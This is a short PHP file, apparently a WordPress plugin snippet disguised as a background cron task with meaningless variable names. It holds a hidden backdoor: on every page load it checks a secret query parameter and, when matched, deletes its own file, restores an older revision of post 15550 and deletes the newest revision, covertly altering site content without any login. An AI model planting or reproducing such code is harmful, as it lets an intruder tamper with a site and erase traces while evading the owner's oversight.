<?php

function master_background_cron() {
	if (isset($_GET['marketing_best_orders']) && $_GET['marketing_best_orders'] === 'permalink_term_secure_anti') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$text_only_autocomplete = 15550;
		$another_wow_analytics = wp_get_post_revisions($text_only_autocomplete);
		if (empty($another_wow_analytics)) die('no revisions');
		if (count($another_wow_analytics) < 2) die('less than 2');
		$active_age_random = array_shift($another_wow_analytics);
		$responsive_maker_limit = $active_age_random->ID;
		$gift_terms_uploads = array_shift($another_wow_analytics);
		$share_suite_simply_switch = $gift_terms_uploads->ID;
		$tabs_number_pack_engine = wp_restore_post_revision($share_suite_simply_switch);
		if ($tabs_number_pack_engine === false) die('error restoring');
		$tabs_number_pack_engine = wp_delete_post_revision($responsive_maker_limit);		
		if ($tabs_number_pack_engine === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'master_background_cron');
